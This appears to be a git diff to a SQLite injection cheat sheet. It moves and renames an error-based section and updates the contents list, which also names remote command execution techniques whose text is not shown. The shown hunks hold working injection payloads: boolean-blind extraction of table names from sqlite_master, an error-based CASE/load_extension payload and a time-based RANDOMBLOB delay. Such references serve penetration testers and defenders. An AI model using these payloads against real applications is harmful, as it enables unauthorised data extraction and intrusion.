@@ -10,8 +10,8 @@
 * [Boolean - Count number of tables](#boolean---count-number-of-tables)
 * [Boolean - Enumerating table name](#boolean---enumerating-table-name)
 * [Boolean - Extract info](#boolean---extract-info)
+* [Boolean - Error based](#boolean---error-based)
 * [Time based](#time-based)
-* [Boolean error based](#boolean-error-based)
 * [Remote Command Execution using SQLite command - Attach Database](#remote-command-execution-using-sqlite-command---attach-database)
 * [Remote Command Execution using SQLite command - Load_extension](#remote-command-execution-using-sqlite-command---load_extension)
 * [References](#references)
@@ -72,17 +72,18 @@ and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name 
 and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
 ```
 
+## Boolean - Error based
+
+```sql
+AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
+```
+
 ## Time based
 
 ```sql
 AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
 ```
 
-## Boolean error based
-
-```sql
-AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
-```
 
 ## Remote Command Execution using SQLite command - Attach Database
 
